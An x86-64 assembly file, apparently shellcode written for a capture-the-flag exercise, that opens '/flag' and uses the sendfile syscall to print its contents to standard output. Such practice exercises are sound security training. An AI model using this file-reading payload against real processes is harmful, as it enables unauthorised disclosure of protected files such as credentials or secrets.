.global _start
.intel_syntax noprefix


_start:
	// Open flag
	mov rax, 2 # open syscall
	lea rdi, [rip + flagname]
	mov rsi, 0
	mov rdx, 1
	syscall
	
	// Open /dev/stdout, not always fixed to 1 for somereason
	push rax
	mov rax, 2
	lea rdi, [rip + stdout]
	mov rsi, 2
	mov rdx, 1
	syscall
	
	// call sendfile syscall to stdout
	mov rdi, rax
	pop rsi
	mov rax, 40
	mov rdx, 0
	mov r10, 1000
	syscall

	mov rax, 60
	syscall

flagname:
	.string "/flag"
stdout:
	.string "/dev/stdout"
